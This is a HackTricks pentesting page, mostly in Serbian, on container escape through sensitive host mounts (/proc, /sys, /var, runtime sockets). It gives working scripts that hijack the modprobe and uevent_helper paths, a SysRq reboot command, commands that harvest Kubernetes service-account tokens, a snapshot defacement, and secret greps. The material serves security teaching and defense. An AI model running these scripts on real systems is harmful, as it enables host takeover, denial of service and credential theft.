# Osetljivi host mountovi

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Host mountovi su jedna od najvažnijih praktičnih container-escape površina zato što često urušavaju pažljivo izolovan prikaz procesa i vraćaju direktnu vidljivost host resursa. Opasni slučajevi nisu ograničeni na `/`. Bind mountovi `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state ili putevi vezani za uređaje mogu izložiti kernel kontrole, kredencijale, fajlsisteme susednih containera i interfejse za upravljanje runtime-om.

Ova stranica postoji odvojeno od pojedinačnih stranica sa zaštitama zato što je model zloupotrebe presečan. Writable host mount je opasan delimično zbog mount namespace-ova, delimično zbog user namespace-ova, delimično zbog AppArmor ili SELinux pokrivenosti, i delimično zbog tačno kog host puta je izložen. Tretiranje kao posebne teme olakšava rasuđivanje o površini napada.

## `/proc` Izloženost

procfs sadrži i obične informacije o procesima i visokorizične kernel kontrolne interfejse. Bind mount kao `-v /proc:/host/proc` ili prikaz containera koji otkriva neočekivane upisive proc unose stoga može dovesti do otkrivanja informacija, denial of service, ili direktnog izvršavanja koda na hostu.

Visoko-vredne procfs putanje uključuju:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Zloupotreba

Počnite proverom koji su visoko-vredni procfs unosi vidljivi ili upisivi:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Ove putanje su zanimljive iz različitih razloga. `core_pattern`, `modprobe`, i `binfmt_misc` mogu postati putanje za izvršavanje koda na hostu ako su upisive. `kallsyms`, `kmsg`, `kcore`, i `config.gz` su snažni izvori informacija za kernel exploitation. `sched_debug` i `mountinfo` otkrivaju kontekst procesa, cgroup i fajl-sistema koji mogu pomoći da se rekonstruše raspored hosta iznutra u containeru.

Praktična vrednost svake putanje je različita, i tretiranje svih kao da imaju isti uticaj otežava triage:

- `/proc/sys/kernel/core_pattern`
Ako je upisiv, ovo je jedna od putanja u procfs-u sa najvećim uticajem jer kernel izvršava pipe handler nakon pada. Container koji može usmeriti `core_pattern` na payload smešten u svom overlay-u ili u mountovanoj host putanji često može dobiti host code execution. Pogledajte takođe [read-only-paths.md](protections/read-only-paths.md) za poseban primer.
- `/proc/sys/kernel/modprobe`
Ova putanja kontroliše userspace helper koji kernel koristi kada treba da pozove logiku za učitavanje modula. Ako je upisiva iz container-a i interpretirana u kontekstu hosta, može postati još jedan primitiv za host code execution. Posebno je interesantna kada se kombinuje sa načinom da se trigger-uje helper putanja.
- `/proc/sys/vm/panic_on_oom`
Obično nije čist primitiv za eskap, ali može pretvoriti memorijski pritisak u host-wide denial of service tako što OOM uslove pretvara u kernel panic ponašanje.
- `/proc/sys/fs/binfmt_misc`
Ako je interfejs za registraciju upisiv, napadač može registrovati handler za izabranu magic vrednost i dobiti izvršavanje u kontekstu hosta kada se izvrši odgovarajući fajl.
- `/proc/config.gz`
Koristan za triage kernel exploit-a. Pomaže odrediti koja podsistema, mitigacije i opciona kernel svojstva su omogućena bez potrebe za host package metadata.
- `/proc/sysrq-trigger`
Uglavnom putanja za denial-of-service, ali veoma ozbiljna. Može reboot-ovati, izazvati panic, ili na drugi način odmah poremetiti host.
- `/proc/kmsg`
Otkriva poruke kernel ring buffera. Koristan za host fingerprinting, analizu crash-a, i u nekim okruženjima za leaking informacija korisnih za kernel exploitation.
- `/proc/kallsyms`
Vredan kada je čitljiv jer otkriva exported kernel simbol informacije i može pomoći da se pobiju pretpostavke o address randomization tokom razvoja kernel exploit-a.
- `/proc/[pid]/mem`
Ovo je direktan proces-memorija interfejs. Ako je cilj proces dostupan uz neophodne ptrace-style uslove, može dozvoliti čitanje ili modifikovanje memorije drugog procesa. Realističan uticaj uveliko zavisi od kredencijala, `hidepid`, Yama i ptrace ograničenja, tako da je to moćna ali uslovna putanja.
- `/proc/kcore`
Izlaže view sistema memorije u stilu core-image. Fajl je ogroman i nezgodan za korišćenje, ali ako je čitljiv u značajnoj meri, ukazuje na loše izloženu površinu host memorije.
- `/proc/kmem` i `/proc/mem`
Istorijski visoko-impaktni raw memory interfejsi. Na mnogim modernim sistemima su onemogućeni ili jako ograničeni, ali ako su prisutni i upotrebljivi treba ih tretirati kao kritične nalaze.
- `/proc/sched_debug`
Leaks informacije o rasporedu i task-ovima koje mogu otkriti identitete host procesa čak i kada drugi pogledi na procese izgledaju čišće nego što se očekivalo.
- `/proc/[pid]/mountinfo`
Izuzetno koristan za rekonstrukciju gde se container zaista nalazi na hostu, koje putanje su overlay-backed, i da li writable mount odgovara sadržaju hosta ili samo container layer-u.

Ako su `/proc/[pid]/mountinfo` ili overlay detalji čitljivi, iskoristite ih da povratite host-putanju filesystema containera:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Ove komande su korisne zato što mnogi trikovi za izvršavanje na hostu zahtevaju da se putanja iz containera prevede u odgovarajuću putanju iz perspektive hosta.

### Potpun primer: `modprobe` Helper Path Abuse

Ako je `/proc/sys/kernel/modprobe` upisiv iz containera i helper path se interpretira u kontekstu hosta, može biti preusmeren na payload koji kontroliše napadač:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Tačan okidač zavisi od cilja i ponašanja kernela, ali bitna stvar je da writable helper path može preusmeriti buduću kernel helper invocation na host-path sadržaj koji je pod kontrolom napadača.

### Kompletan primer: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Ako je cilj procena mogućnosti iskorišćavanja umesto trenutnog bekstva:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Ove komande pomažu da se utvrdi da li su korisne informacije o simbolima vidljive, da li nedavne kernel poruke otkrivaju interesantno stanje i koje su kernel funkcije ili mitigacije kompajlirane. Učinak obično nije direktan escape, ali može znatno skratiti kernel-vulnerability triage.

### Puni primer: SysRq — ponovno pokretanje hosta
```bash
echo b > /proc/sysrq-trigger
```
Efekat je neposredan host reboot. Ovo nije suptilan primer, ali jasno pokazuje da procfs izloženost može biti mnogo ozbiljnija od otkrivanja informacija.

## `/sys` izloženost

sysfs izlaže velike količine stanja kernela i uređaja. Neke sysfs putanje su uglavnom korisne za fingerprinting, dok druge mogu uticati na izvršenje helper-a, ponašanje uređaja, konfiguraciju security-module-a, ili firmware stanje.

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ove putanje su važne iz različitih razloga. `/sys/class/thermal` može uticati na thermal-management ponašanje i samim tim stabilnost hosta u loše izloženim okruženjima. `/sys/kernel/vmcoreinfo` can leak crash-dump and kernel-layout information that helps with low-level host fingerprinting. `/sys/kernel/security` je `securityfs` interfejs koji koriste Linux Security Modules, tako da neočekivan pristup tamo može otkriti ili izmeniti MAC-related stanje. EFI variable paths mogu uticati na firmware-backed boot podešavanja, čineći ih mnogo ozbiljnijim od običnih konfiguracionih fajlova. `debugfs` pod `/sys/kernel/debug` je posebno opasan zato što je namerno developer-oriented interfejs sa znatno manje očekivanja u pogledu bezbednosti nego ojačani production-facing kernel APIs.

Korisne komande za pregled ovih putanja su:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
What makes those commands interesting:

- `/sys/kernel/security` may reveal whether AppArmor, SELinux, or another LSM surface is visible in a way that should have stayed host-only.
- `/sys/kernel/debug` is often the most alarming finding in this group. If `debugfs` is mounted and readable or writable, expect a wide kernel-facing surface whose exact risk depends on the enabled debug nodes.
- EFI variable exposure is less common, but if present it is high impact because it touches firmware-backed settings rather than ordinary runtime files.
- `/sys/class/thermal` is mainly relevant for host stability and hardware interaction, not for neat shell-style escape.
- `/sys/kernel/vmcoreinfo` is mainly a host-fingerprinting and crash-analysis source, useful for understanding low-level kernel state.

### Potpun primer: `uevent_helper`

Ako je `/sys/kernel/uevent_helper` upisiv, kernel može izvršiti helper pod kontrolom napadača kada se pokrene `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Razlog zbog kojeg ovo funkcioniše je što se putanja pomoćnika interpretira iz ugla hosta. Kada se pokrene, pomoćnik se izvršava u kontekstu hosta, a ne unutar trenutnog containera.

## `/var` Izloženost

Mountovanje hostovog `/var` u container se često potcenjuje jer ne deluje tako dramatično kao mountovanje `/`. U praksi može biti dovoljno da se pristupi runtime socket-ovima, direktorijumima snapshot‑a containera, kubelet-managed pod volumes, projected service-account tokens i fajl sistemima susednih aplikacija. Na modernim čvorovima, `/var` je često mesto gde zapravo živi najveći deo operativno interesantnog stanja containera.

### Kubernetes primer

Pod sa `hostPath: /var` često može da pročita projected token-e drugih podova i sadržaj overlay snapshot-a:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Ove komande su korisne zato što odgovaraju na pitanje da li mount izlaže samo beznačajne podatke aplikacije ili kritične akreditive klastera. Čitljiv service-account token može odmah pretvoriti lokalno izvršavanje koda u pristup Kubernetes API.

Ako token postoji, proverite šta može da dosegne umesto da se zaustavite na otkriću tokena:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Uticaj ovde može biti mnogo veći od pristupa lokalnom čvoru. Token sa širokim RBAC može pretvoriti montirani `/var` u kompromitovanje čitavog klastera.

### Docker i containerd — primer

Na Docker hostovima relevantni podaci se često nalaze pod `/var/lib/docker`, dok na Kubernetes čvorovima koji koriste containerd mogu biti pod `/var/lib/containerd` ili u snapshotter-specifičnim putanjama:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Ako montirani `/var` izlaže writable snapshot sadržaje drugog workload-a, napadač može izmeniti datoteke aplikacije, postaviti web sadržaj ili promeniti startup skripte bez diranja trenutne container konfiguracije.

Konkretne ideje za zloupotrebu nakon pronalaska writable snapshot sadržaja:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Ove komande su korisne jer pokazuju tri glavne impact families of mounted `/var`: application tampering, secret recovery, and lateral movement into neighboring workloads.

## Runtime Sockets

Sensitive host mounts često uključuju runtime sockets umesto full directories. Runtime sockets su toliko važni da zaslužuju izričito ponavljanje ovde:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Pogledajte [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) za kompletne tokove eksploatacije nakon što je jedan od ovih soketa montiran.

Kao brz početni obrazac interakcije:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Ako jedan od ovih uspe, put od "mounted socket" do "start a more privileged sibling container" obično je mnogo kraći nego bilo koji put za kernel breakout.

## Mount-Related CVEs

Host mount-ovi takođe se preklapaju sa runtime ranjivostima. Važni nedavni primeri uključuju:

- `CVE-2024-21626` u `runc`, gde leaked directory file descriptor može da postavi radni direktorijum na host filesystem.
- `CVE-2024-23651` i `CVE-2024-23653` u BuildKit, gde OverlayFS copy-up races mogu da proizvedu host-path writes tokom build-ova.
- `CVE-2024-1753` u Buildah i Podman build tokovima, gde crafted bind mounts tokom build-a mogu izložiti `/` read-write.
- `CVE-2024-40635` u containerd, gde velika `User` vrednost može preći u ponašanje UID 0.

Ovi CVE-ovi su važni ovde jer pokazuju da rukovanje mount-ovima nije samo pitanje konfiguracije operatera. Sam runtime takođe može uvesti mount-driven escape uslove.

## Checks

Koristite ove komande da brzo pronađete mount izloženosti najveće vrednosti:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- Host root, `/proc`, `/sys`, `/var`, i runtime sockets su nalazi visokog prioriteta.
- Stavke u proc/sys koje se mogu upisati često znače da mount izlaže globalne kontrole kernela hosta, umesto bezbednog prikaza container-a.
- Montirani `/var` putevi zaslužuju pregled kredencijala i susednih workload-ova, a ne samo reviziju sistema fajlova.
{{#include ../../../banners/hacktricks-training.md}}
